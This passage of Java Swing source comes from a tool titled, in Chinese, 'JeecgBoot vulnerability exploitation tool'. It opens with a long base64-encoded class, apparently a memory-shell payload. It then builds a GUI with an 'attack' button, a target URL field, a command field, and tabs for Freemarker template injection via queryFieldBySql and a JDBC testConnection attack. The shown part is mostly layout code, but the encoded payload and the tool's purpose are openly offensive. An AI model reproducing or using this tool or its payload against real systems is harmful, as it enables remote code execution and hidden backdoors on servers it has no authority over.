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')\n"+
                        "======================================================================\n");
            }
        }
    }



    private void initComponents() {
        // JFormDesigner - Component initialization - DO NOT MODIFY  //GEN-BEGIN:initComponents  @formatter:off
        tabbedPane1 = new JTabbedPane();
        panel1 = new JPanel();
        mem1 = new JRadioButton();
        code1 = new JRadioButton();
        label2 = new JLabel();
        cmd = new JTextField();
        panel2 = new JPanel();
        h2 = new JRadioButton();
        mysql = new JRadioButton();
        pgsql = new JRadioButton();
        label3 = new JLabel();
        label4 = new JLabel();
        jdbcuri = new JTextField();
        scrollPane1 = new JScrollPane();
        result = new JTextArea();
        panel3 = new JPanel();
        label1 = new JLabel();
        url = new JTextField();
        attackButton = new JButton();

        //======== this ========
        setTitle("JeecgBoot\u6f0f\u6d1e\u5229\u7528\u5de5\u5177v1.0");
        setBackground(UIManager.getColor("Button.selectedForeground"));
        Container contentPane = getContentPane();
        contentPane.setLayout(null);

        //======== tabbedPane1 ========
        {
            tabbedPane1.addChangeListener(e -> tabbedPane1StateChanged(e));

            //======== panel1 ========
            {
                panel1.setLayout(null);

                //---- mem1 ----
                mem1.setText("\u6ce8\u5165\u5185\u5b58\u9a6c");
                panel1.add(mem1);
                mem1.setBounds(10, 35, 100, 30);

                //---- code1 ----
                code1.setText("\u4ee3\u7801\u6267\u884c");
                panel1.add(code1);
                code1.setBounds(10, 5, 75, 30);

                //---- label2 ----
                label2.setText("\u8bf7\u8f93\u5165\u547d\u4ee4\uff1a");
                panel1.add(label2);
                label2.setBounds(105, 10, label2.getPreferredSize().width, 20);
                panel1.add(cmd);
                cmd.setBounds(185, 10, 440, cmd.getPreferredSize().height);

                {
                    // compute preferred size
                    Dimension preferredSize = new Dimension();
                    for(int i = 0; i < panel1.getComponentCount(); i++) {
                        Rectangle bounds = panel1.getComponent(i).getBounds();
                        preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                        preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
                    }
                    Insets insets = panel1.getInsets();
                    preferredSize.width += insets.right;
                    preferredSize.height += insets.bottom;
                    panel1.setMinimumSize(preferredSize);
                    panel1.setPreferredSize(preferredSize);
                }
            }
            tabbedPane1.addTab("queryFieldBySql Freemarker\u6a21\u677f\u6ce8\u5165", panel1);

            //======== panel2 ========
            {
                panel2.setLayout(null);

                //---- h2 ----
                h2.setText("h2");
                h2.addActionListener(e -> jdbcDriverStateChanged(e));
                panel2.add(h2);
                h2.setBounds(270, 0, 75, 30);

                //---- mysql ----
                mysql.setText("mysql");
                mysql.addActionListener(e -> jdbcDriverStateChanged(e));
                panel2.add(mysql);
                mysql.setBounds(120, 0, 75, 30);

                //---- pgsql ----
                pgsql.setText("pgsql");
                pgsql.addActionListener(e -> jdbcDriverStateChanged(e));
                panel2.add(pgsql);
                pgsql.setBounds(195, 0, 75, 30);

                //---- label3 ----
                label3.setText("\u9009\u62e9\u6570\u636e\u5e93\u9a71\u52a8\uff1a");
                panel2.add(label3);
                label3.setBounds(10, 5, 100, 20);

                //---- label4 ----
                label4.setText("\u8bf7\u8f93\u5165jdbc uri\uff1a");
                panel2.add(label4);
                label4.setBounds(new Rectangle(new Point(10, 35), label4.getPreferredSize()));
                panel2.add(jdbcuri);
                jdbcuri.setBounds(120, 30, 505, jdbcuri.getPreferredSize().height);

                {
                    // compute preferred size
                    Dimension preferredSize = new Dimension();
                    for(int i = 0; i < panel2.getComponentCount(); i++) {
                        Rectangle bounds = panel2.getComponent(i).getBounds();
                        preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                        preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
                    }
                    Insets insets = panel2.getInsets();
                    preferredSize.width += insets.right;
                    preferredSize.height += insets.bottom;
                    panel2.setMinimumSize(preferredSize);
                    panel2.setPreferredSize(preferredSize);
                }
            }
            tabbedPane1.addTab("testConnection JDBC", panel2);
        }
        contentPane.add(tabbedPane1);
        tabbedPane1.setBounds(0, 60, 745, 95);

        //======== scrollPane1 ========
        {
            scrollPane1.setViewportView(result);
        }
        contentPane.add(scrollPane1);
        scrollPane1.setBounds(0, 160, 743, 440);

        //======== panel3 ========
        {
            panel3.setLayout(null);

            //---- label1 ----
            label1.setText("\u8bf7\u8f93\u5165URL\uff1a");
            panel3.add(label1);
            label1.setBounds(10, 15, 80, 30);
            panel3.add(url);
            url.setBounds(85, 15, 540, 30);

            //---- attackButton ----
            attackButton.setText("attack");
            attackButton.addActionListener(e -> {try {
button3(e);} catch (Exception ex) {
    throw new RuntimeException(ex);
}});
            panel3.add(attackButton);
            attackButton.setBounds(630, 15, 110, 30);

            {
                // compute preferred size
                Dimension preferredSize = new Dimension();
                for(int i = 0; i < panel3.getComponentCount(); i++) {
                    Rectangle bounds = panel3.getComponent(i).getBounds();
                    preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                    preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
                }
                Insets insets = panel3.getInsets();
                preferredSize.width += insets.right;
                preferredSize.height += insets.bottom;
                panel3.setMinimumSize(preferredSize);
                panel3.setPreferredSize(preferredSize);
            }
        }
        contentPane.add(panel3);
        panel3.setBounds(0, 0, 745, 60);

        {
            // compute preferred size
            Dimension preferredSize = new Dimension();
            for(int i = 0; i < contentPane.getComponentCount(); i++) {
                Rectangle bounds = contentPane.getComponent(i).getBounds();
                preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
            }
            Insets insets = contentPane.getInsets();
            preferredSize.width += insets.right;
            preferredSize.height += insets.bottom;
            contentPane.setMinimumSize(preferredSize);
            contentPane.setPreferredSize(preferredSize);
        }
        pack();
        setLocationRelativeTo(getOwner());
        // JFormDesigner - End of component initialization  //GEN-END:initComponents  @formatter:on
    }
    // 按钮点击事件


    // JFormDesigner - Variables declaration - DO NOT MODIFY  //GEN-BEGIN:variables  @formatter:off
    private JTabbedPane tabbedPane1;
    private JPanel panel1;
    private JRadioButton mem1;
    private JRadioButton code1;
    private JLabel label2;
    private JTextField cmd;
    private JPanel panel2;
    private JRadioButton h2;
    private JRadioButton mysql;
    private JRadioButton pgsql;
    private JLabel label3;
    private JLabel label4;
    private JTextField jdbcuri;
    private JScrollPane scrollPane1;
    private JTextArea result;
    private JPanel panel3;
    private JLabel label1;
    private JTextField url;
    private JButton attackButton;
    // JFormDesigner - End of variables declaration  //GEN-END:variables  @formatter:on

}
